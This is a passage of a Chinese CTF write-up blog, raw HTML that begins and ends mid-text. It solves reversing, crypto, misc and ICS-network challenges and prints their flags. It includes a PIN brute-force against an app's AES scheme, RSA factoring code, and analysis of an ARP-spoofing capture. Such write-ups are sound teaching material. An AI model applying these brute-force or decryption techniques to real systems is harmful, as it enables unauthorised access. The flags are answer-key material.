punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment">#?</span>password<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x40</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">7</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">19</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">5</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> password<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token comment">#print(str(password))</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：<code>CTF&#123;7a0QfB8dr1cF293Oy5a9fk9ŤA01c&#125;</code>，但是Ť这个字符很明显不是ASCII编码，在仔细观察之后，发现这个字符十进制数表示为356，模256之后的结果为100。对应的字符为d</p><p>那正确的结果为</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;7a0QfB8dr1cF293Oy5a9fk9dA01c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-PIZZA-PAZZI"><a href="#3-5-PIZZA-PAZZI" class="headerlink" title="3-5 PIZZA PAZZI"></a><strong>3-5 PIZZA PAZZI</strong></h3><p>题目提供了一个apk文件。利用jadx进行反编译，并找到程序入口位置。根据第一题的题目，Listening in on the conversation。我们将apk文件使用keytool生成jks，再用apksigner完成v2签名，随后安装到雷电模拟器的安卓系统中。</p><p>然后使用fiddler4监控雷电模拟器发出的数据包，找到了<a href="https://pizzapazzi.challenge.hackazon.org/%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0%E7%AC%AC%E4%B8%80%E5%85%B3%E7%9A%84%E7%AD%94%E6%A1%88%E3%80%82">https://pizzapazzi.challenge.hackazon.org/，访问之后得到第一关的答案。</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/u_muE2nJRY2-WAioI6IVTw.png" alt="20"></p><p>第二关，按照网页中显示的提示，我们可以阅读代码，从中得到更多的信息。这里我走了很多弯路，我一直以为是要动态调试这个app，但是打开之后点击Get started之后，app自动关闭。我开始怀疑是雷电模拟器版本的问题，随后下载了Android studio并安装Nexus5x的安卓模拟器，在该系统上面安装之后依然还是打不开。</p><p>之后没得办法又重新回到代码中，怀疑这些字符串是base64编码，解码之后后面的题目就迎刃而解啦。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/36NgagSGpYKpFXPjuHcAAA.png" alt="21"></p><p>所以又重新回到代码上，去寻找恶意代码。这里又走了弯路，这个app本身就是不完整的。其实在函数名称设置上已经有了提示。接下来的关卡都是一样的。采用的都是base64编码，模拟的就是后台挖矿的程序。</p><p>第三关</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/J4EBRWJm2Qeeu94w9gcEiw.png" alt="22"></p><p>第四关</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/iSLzfxsxfi72lIhl4zV18g.png" alt="23"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/F6z7pc4n98L2NXa6IkYxPg.png" alt="24"></p><h3 id="4-3-IDENTIFY-YOURSELF"><a href="#4-3-IDENTIFY-YOURSELF" class="headerlink" title="4-3 IDENTIFY YOURSELF"></a><strong>4-3</strong> <strong>IDENTIFY YOURSELF</strong></h3><p>这个题要根据题目中提供的DigitalId.apk，找出session.raw中保存的flag。</p><p>首先还是通过jadx对该apk文件进行反编译。通过反编译之后的代码，我们可以得到程序采用了AES对称加密的方式。先利用UUID生成的 32bytes 随机的十六进制字符串，对密文进行加密。再通过用户输入的PIN（4个拼接到一起的，每个4bytes，组到一起刚好是16bytes），对UUID进行加密。</p><p>然后，尝试通过在反编译之后的代码中寻找有关PIN的信息。发现并没有相关的信息。通过尝试安装软件运行发现，PIN中仅仅支持数字输入，所以呢，我们采取爆破的方式。</p><p>利用kali虚拟机生成包含4位数字的所有组合，再通过一样的解密过程，将密文解密出来。最终在发现1337即为PIN，也找到了最终的Flag。</p><p>![25](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (13).png)</p><p>此题，思路并没有多大的问题，但是由于本人对基础知识的认识不够。所以走了很多弯路。</p><p>首先，所有的字符串在内存中都是以二进制存储的，十六进制形式只是其诸多展现形式中的一种而已(此外还有8进制等)。在程序语言中，将字符串转为十六进制字符串，即是将字符串在内存当中存储的二进制—-以十六进制形式展现出来。如果把real_key以十六进制展示出来的话，会是 ce1feee3……等等。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QkVIgwLK8_8Qd5W5PQMt7A.png" alt="26"></p><p>接着，如何对这些二进制编码，是编码层面的问题，这里面有大家所熟知的Ascii码，UTF-8，UTF-16等等。这些编码说白了，就是按照自己的规则去读取内存中的二进制，然后查找该二进制对应的字母或者其他控制符等等。显然一个字节byte能标识的数据显然不够，所以又出现了UTF-16、Unicode编码等。不过对于英文的话，UTF-8编码是足够了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/rRV9NCsAVIF8kyedReM_YQ.png" alt="27"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="2-1-ENCAPSULATION"><a href="#2-1-ENCAPSULATION" class="headerlink" title="2-1 ENCAPSULATION"></a><strong>2-1</strong> <strong>ENCAPSULATION</strong></h3><p>这是一道关于简单密码学加解密的题目，共分为三关：Encapsulation、Cipher Squabble 以及 Back to the basics。</p><p>第一关是一道简单的编码转化题。题目首先提供了一张图片 “binary.jpeg” ，直接打开发现并没有什么线索，进一步我们使用记事本打开，发现里面全是字符 “ ( “ 和 “ 9 “，由于只有两种符号，开始猜测为摩斯电码，解码发现并不成功，后来结合图片名称，将其理解为二进制，于是将其分别转为 “ 0 “ 和 “ 1 “ 进行表示，并需要考虑如何转换成带有字母符号的字符串，于是转换成 ASCII ，得到一串新的代码。（bin2Ascii）</p><p>此时查看新的代码发现，存在最后一位为 “ = “，考虑 base64 编码，进行解码后得到 flag。（baseX解码）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;UGVwcGFpc2FwaWc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关为简单的密码解密题。根据前一题得到的解密结果，能够发现一定线索。</p><p>![28](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (2).png)</p><p>其中第一个人是密码学家，并且搜索发现与之相关的密码加密方式为 “维吉尼亚密码” ，而改密码需要一个 Key 来帮助解密，句中提及他的中间名可以帮助，因此得到 “ Battista “，最后进行解密得到 flag。（维吉尼亚解密）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;QMVSBGFZB2LUDMVUDGVKDGhPC2NPCGHLCG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关<strong>Uncompleted。</strong>同样是密码解迷题。根据前一题得到的解密结果，能够发现一定线索。</p><p>![29](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (3).png)</p><p>暂时猜测他 shuffle 的意思是某种换序加密，想到格栅密码，但是尝试并未找的 flag，同时认为他所提到的 cylinder 是某种轮盘加密，暂时不知道使用什么进行解密。</p><h3 id="2-2-SECRET-CONVE’RSA’TION"><a href="#2-2-SECRET-CONVE’RSA’TION" class="headerlink" title="2-2 SECRET CONVE’RSA’TION"></a><strong>2-2</strong> <strong>SECRET CONVE’RSA’TION</strong></h3><p>这是一道关于 RSA 计算的题目，仅一关。</p><p>本关卡提供了一个文件，包含了 RSA 计算中的公钥（N，e）以及密文 c。提供的参数较少，仅有密钥和密文，理论上是很难破解的，需要我们爆破算出两个因数 p 和 q，由于数字十分巨大爆破不好实现，因此首先考虑一些方法进行分解，经查询有以下几种情况及算法。</p><ol><li>N 较小：短除法、Miller-Rabin素性测试和离散对数Pollard_rho分解；</li><li>N 较大：在线查询 <a href="http://factordb.com/">http://factordb.com</a></li><li>e 过大或过小：Wiener’s attack</li><li>p 和 q 相近：费马分解</li></ol><p>参考文档：CTF-RSA 大整数分解</p><p>因此我首先首先尝试了费马分解，并成功获取 p 和 q，进而求得 phi 和 d，最后根据公式 m = pow(c, d, n) 获取明文。</p><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779855101287148374206957436458915587712518501281793789555480805845328694482152421962093714097210685267495028743960484986044572019270471629952251128834754752071</span>q <span class="token operator">=</span> <span class="token number">72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779768486519862521371761417707655650528352916168732086751886502287478577426433344249124093776641317837723657300923622528678618140782421245730805689484709681027</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">5261933844650100908430030083398098838688018147149529533465444719385566864605781576487305356717074882505882701585297765789323726258356035692769897420620858774763694117634408028918270394852404169072671551096321238430993811080749636806153881798472848720411673994908247486124703888115308603904735959457057925225503197625820670522050494196703154086316062123787934777520599894745147260327060174336101658295022275013051816321617046927321006322752178354002696596328204277122466231388232487691224076847557856202947748540263791767128195927179588238799470987669558119422552470505956858217654904628177286026365989987106877656917</span>c <span class="token operator">=</span> <span class="token number">176955087574615470063741472647197409875117482285309340581271852382710990213049325727125711804231234813146490233229473679126800639397642380073858980601348297248196895714845780751708931869367483971257602632592317987276609144131149239628356913355893753937582033295526684103570648143766629320982809943886265840131929175495923219383837739522744946987913271495217642469261483099144404131616847257182856944641353523297845726161862062019653065904612865722942649827600090466968124488518262272506900322544403300651512798674316560281124899873116026534973842919190849918357740307152880452169695889599662477611952919511642717417</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m的值为:"</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求得 m 后，根据提示 flag 为 CTF{xxx}，根据获得 m 前两位为 67，猜测需要转为 ASCII 码，转换后成功获取 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;RSA_br0ken&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="1-3-AUDIBLE-TRANSMISSION"><a href="#1-3-AUDIBLE-TRANSMISSION" class="headerlink" title="1-3 AUDIBLE TRANSMISSION"></a><strong>1-3</strong> <strong>AUDIBLE TRANSMISSION</strong></h3><p>这是一道音频wav的隐写题目，分为两关：For your eyes only 以及 Code。</p><p>第一关是频谱隐写，使用工具Audacity即可查看音频的频谱图拿到flag. 其实无论是频谱隐写还是波形隐写其音频听起来都是异常的，可以通过此方法来判断。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/BquF8GIbMHL0grUrZaxNwg.png" alt="30"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Tagalog&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关<strong>Uncompleted</strong>，目前的猜测是出题人将一段code隐藏到中间的音频中啦。中间的音频听起来就是倒放，因此首先将整段音频使用Audacity提供的效果-&gt;反向（时间）来反转。但是处理之后听起来是清晰且顺畅的了，但是仍不知道是什么语言，在说什么。因为其内容上听起来没有杂音，所以猜想是使用某种成熟的对原音频影响较小音频隐写算法。目前尝试了Stegohide（Stegseek(密码爆破)），AudioStego以及LSB(wavStego，手写脚本)，但是生成的字节都是没有实义的。</p><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="1-1-CHEMICAL-PLANT"><a href="#1-1-CHEMICAL-PLANT" class="headerlink" title="1-1 CHEMICAL PLANT"></a><strong>1-1</strong> <strong>CHEMICAL PLANT</strong></h3><p>这同样是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Find the attack point、Record everything、Know the limit 以及 True or false。</p><p>第一关非常简单，需要我们找到受攻击的组件，flag 为 CTF{component}。根据视频我们能够发现，视频中 Pressure 部分一直增加超过了限度，导致了爆炸，因此这是被攻击的组件。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Pressure&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关同样比较简单，需要我们找到受攻击的准确时刻。这里需要进行流量分析（Wireshark： “分析–&gt;专家信息”），能够发现作者在其中添加了 comment 为我们进行提示。打开便能够发现第二关到第四关的所有线索。其中对第二关的线索如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/jvKaukugxsqAaNqx5m_8ag.png" alt="31"></p><p>同样我们能够看出为 base64 编码，解码后获取 flag。（baseX解码）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;M0DBU5_RE4D_R1GHT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关<strong>Uncompleted</strong>，需要我们找到受攻击的设定值。其中对第三关的线索如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/wjWgdnc7_QzcVmY6i8KlLQ.png" alt="32"></p><p>但是还是没搞懂这个指的设定值是说什么。</p><p>第四关，需要我们找到寄存器线圈中的数据类型，flag 为 CTF{datatype}。根据第二关线索可知其数据类型为 binary，如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0_UyX98l5vObVLrL66DyFw.png" alt="33"></p><p>其次他也呼应了题目的名称 True or false。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;binary&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-YOU-CAN’T-SEE-ME"><a href="#1-2-YOU-CAN’T-SEE-ME" class="headerlink" title="1-2 YOU CAN’T SEE ME"></a><strong>1-2</strong> <strong>YOU CAN’T SEE ME</strong></h3><p>这是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Parts make a whole、whoami、Man-in-the-middle 以及 Follow me till the end。</p><p>第一关是一个数据流追踪的问题。根据题目名称我们可以推测出需要将分散的数据包进行追踪，同时我们可以发现大多为 TCP 数据包，因此我们将 TCP 流进行追踪（Wireshark：” 分析–&gt;追踪流–&gt;TCP” ），接着我们进行翻阅可以看到 flag。</p><p>![34](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (4).png)</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Hacky_Holidays_ICS&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关是一个异常流量寻找的问题，flag 为 IP 地址。我们需要找到异常的组件，我的方法不一定准确（可能碰运气），我最开始是查看了流量图。（Wireshark：”统计”–&gt;”流量图”）发现有个内部 IP 频繁与外界 IP 进行数据交换，尝试发现正确。</p><pre class="line-numbers language-none"><code class="language-none">192.168.198.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关是寻找中间人攻击使用的协议，flag 为 CTF{protocol_in_capital_letters}。然后我思考了一下常见的中间人攻击方式，首先想到的是 ARP 欺骗，正确。</p><pre class="line-numbers language-none"><code class="language-none">192.168.198.136 -- 00:0c:29:7f:db:1c192.168.198.138 -- 00:0c:29:80:8c:09192.168.198.128 -- 00:0c:29:2a:0b:dd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是需要验证为什么，我查询了 ARP 的数据包，发现 136 向内部网关询问 138 的地址，网关开始询问大家 138 的地址，而 128 一直向网关传递的是自己的地址，于是 136 将 128 认为是 138 的地址，从而完成了欺骗，使 128 成为了中间人（136 – 128 –138）。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;ARP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第四关 寻找目标机器与外部机器之间沟通的报文，主要使用了(右键选择追踪流-&gt;追踪TCP流)，再不断增加流编号的过程中，发现了339流中存在HTTP协议报文。</p><p>![35](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (5).png)</p><p>将该报文中的HTML源码复制到txt文件中再重新命名为html，打开之后即可得到flag–是一个由base64编码的图片。（筛选的过程中一度怀疑TSL协议流中蕴含着flag，想要通过数据包中传递的密钥破解数据包中加密传递的信息。但从理论上来说仅从数据包破解TSL协议的可能性不大，包中传递的也都是公钥。）</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/g1biwI-jXY-HY_QDEDFCOQ.png" alt="36"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;5ERVER_15_H3R3&#125;        <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a><strong>PPC</strong></h2><p>Professionally Program 